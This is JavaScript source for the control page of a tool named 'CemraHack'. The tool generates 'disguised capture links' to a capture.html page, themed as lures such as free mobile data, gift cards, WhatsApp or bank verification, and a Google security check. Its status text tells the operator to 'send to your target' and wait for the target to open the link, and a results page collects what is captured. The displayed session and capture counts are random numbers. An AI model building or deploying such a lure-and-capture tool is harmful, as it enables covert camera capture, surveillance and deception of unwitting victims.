/* ================================================
   APP.JS — Home Page Logic (CemraHack)
   With 10-Theme Selection Support
   ================================================ */

// ---- Particle Generator ----
(function createParticles() {
  const container = document.getElementById('particles');
  if (!container) return;
  for (let i = 0; i < 30; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + 'vw';
    p.style.width = p.style.height = (Math.random() * 3 + 1) + 'px';
    p.style.animationDuration = (Math.random() * 12 + 8) + 's';
    p.style.animationDelay = '-' + (Math.random() * 12) + 's';
    p.style.opacity = Math.random() * 0.5 + 0.1;
    container.appendChild(p);
  }
})();

// ---- Theme map (value → display name) ----
const THEME_NAMES = {
  freedata: 'Free Mobile Data',
  giftcard: 'Gift Card Reward',
  lucky: 'Lucky Winner',
  video: 'Video Verification',
  whatsapp: 'WhatsApp Verify',
  google: 'Security Check',
  instagram: 'Instagram Offer',
  bank: 'Bank Verification',
  speedtest: 'Speed Test App',
  music: 'Free Music App'
};

// ---- State ----
let currentSession = null;
let generatedLink = null;
let selectedTheme = 'freedata'; // default

// ---- Select a theme card ----
function selectTheme(card) {
  document.querySelectorAll('.theme-card').forEach(c => c.classList.remove('selected'));
  card.classList.add('selected');
  selectedTheme = card.dataset.theme;
  document.getElementById('selectedThemeName').textContent = THEME_NAMES[selectedTheme] || selectedTheme;

  // Reset link if already generated
  if (generatedLink) {
    generatedLink = null;
    const linkBox = document.getElementById('linkBox');
    document.getElementById('generatedLink').textContent = 'Theme changed — please regenerate your link...';
    linkBox.classList.remove('has-link');
    linkBox.querySelector('i').className = 'fa-solid fa-lock';
    document.getElementById('copyBtn').disabled = true;
    const btn = document.getElementById('generateBtn');
    btn.innerHTML = '<i class="fa-solid fa-wand-magic-sparkles"></i> Generate Link';
    btn.disabled = false;
  }
  setStatus(`Theme selected: ${THEME_NAMES[selectedTheme]} — Click Generate`, 'info');
}

// ---- On Load ----
window.addEventListener('DOMContentLoaded', () => {
  const saved = localStorage.getItem('cemra_session');
  if (saved) {
    currentSession = saved;
    document.getElementById('sessionId').textContent = saved;
  } else {
    generateSession();
  }
  animateCounter('statSessions', 0, Math.floor(Math.random() * 40 + 10), 1200);
  animateCounter('statCaptures', 0, Math.floor(Math.random() * 300 + 80), 1400);
});

// ---- Generate random session ID ----
function generateSession() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let id = '';
  for (let i = 0; i < 16; i++) {
    if (i > 0 && i % 4 === 0) id += '-';
    id += chars[Math.floor(Math.random() * chars.length)];
  }
  currentSession = id;
  localStorage.setItem('cemra_session', id);
  document.getElementById('sessionId').textContent = id;
  return id;
}

// ---- Regenerate session ----
function regenerateSession() {
  const btn = document.querySelector('.btn-icon');
  btn.classList.add('spin');
  setTimeout(() => btn.classList.remove('spin'), 500);
  generateSession();
  if (generatedLink) {
    generatedLink = null;
    document.getElementById('generatedLink').textContent = 'Session changed — please regenerate...';
    const linkBox = document.getElementById('linkBox');
    linkBox.classList.remove('has-link');
    linkBox.querySelector('i').className = 'fa-solid fa-lock';
    document.getElementById('copyBtn').disabled = true;
    const btn2 = document.getElementById('generateBtn');
    btn2.innerHTML = '<i class="fa-solid fa-wand-magic-sparkles"></i> Generate Link';
    btn2.disabled = false;
    setStatus('Session regenerated — please generate a new link', 'info');
  }
}

// ---- Generate capture link ----
function generateLink() {
  const btn = document.getElementById('generateBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Generating...';
  setStatus('Generating disguised capture link...', 'info');

  setTimeout(() => {
    const sessionId = currentSession || generateSession();

    // Robust URL generation: use the current location's origin and path
    // This avoids issues when running from file:// or subdirectories
    let base = window.location.href.split('?')[0]; // remove query params
    if (base.endsWith('index.html')) {
      base = base.substring(0, base.lastIndexOf('index.html'));
    } else if (!base.endsWith('/')) {
      base = base.substring(0, base.lastIndexOf('/') + 1);
    }

    const token = btoa(sessionId + ':' + Date.now()).replace(/=/g, '').substring(0, 24);
    generatedLink = `${base}capture.html?s=${sessionId}&t=${token}&th=${selectedTheme}`;

    console.log('Generated Link:', generatedLink);

    const sessions = JSON.parse(localStorage.getItem('cemra_sessions') || '[]');
    if (!sessions.includes(sessionId)) {
      sessions.push(sessionId);
      localStorage.setItem('cemra_sessions', JSON.stringify(sessions));
    }

    const linkBox = document.getElementById('linkBox');
    linkBox.classList.add('has-link');
    linkBox.querySelector('i').className = 'fa-solid fa-unlock';
    document.getElementById('generatedLink').textContent = generatedLink;
    document.getElementById('copyBtn').disabled = false;

    btn.disabled = false;
    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> Regenerate';

    const themeName = THEME_NAMES[selectedTheme] || selectedTheme;
    setStatus(`✓ Link ready [${themeName}] — Copy and send to your target`, 'success');
  }, 1600);
}

// ---- Copy link ----
function copyLink() {
  if (!generatedLink) return;
  navigator.clipboard.writeText(generatedLink).then(() => {
    showToast('Link copied to clipboard!');
    setStatus('Link copied! Waiting for target to open it...', 'success');
    const btn = document.getElementById('copyBtn');
    btn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
    setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy Link'; }, 2000);
  }).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = generatedLink;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    showToast('Link copied!');
  });
}

// ---- Navigate to results ----
function goToResults() {
  window.location.href = 'results.html?s=' + (currentSession || '');
}

// ---- Status bar helper ----
function setStatus(msg, type = 'info') {
  const bar = document.getElementById('statusBar');
  const txt = document.getElementById('statusText');
  txt.textContent = msg;
  bar.className = 'status-bar' + (type === 'success' ? ' success' : '');
  bar.querySelector('i').className = type === 'success'
    ? 'fa-solid fa-circle-check'
    : 'fa-solid fa-circle-info';
}

// ---- Toast helper ----
function showToast(msg) {
  const toast = document.getElementById('toast');
  document.getElementById('toastMsg').textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 3000);
}

// ---- Animated counter ----
function animateCounter(id, from, to, duration) {
  const el = document.getElementById(id);
  if (!el) return;
  const start = performance.now();
  function step(now) {
    const elapsed = Math.min((now - start) / duration, 1);
    el.textContent = Math.floor(from + (to - from) * easeOut(elapsed));
    if (elapsed < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}
function easeOut(t) { return 1 - Math.pow(1 - t, 3); }
